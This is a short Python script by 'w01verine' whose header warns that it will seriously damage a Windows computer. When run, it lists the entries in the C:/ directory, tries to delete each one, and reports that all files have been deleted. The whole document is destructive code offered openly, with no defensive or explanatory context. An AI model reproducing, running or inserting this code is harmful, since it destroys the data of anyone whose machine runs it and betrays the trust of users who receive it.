# Created By: w01verine 2023

# WARNING! RUNNING THIS PROGRAM WILL CAUSE SERIOUS DAMAGE TO A WINDOWS COMPUTER

import os

# This program will delete all files in the C:/ directory
def delete_files():
    try:
        directory = 'C:/'
        for filename in os.listdir(directory):
            file_path = os.path.join(directory, filename)
            os.remove(file_path)
        print('All files in C:/ directory have been deleted.')
    except Exception as e:
        print('Error:', e)

delete_files()
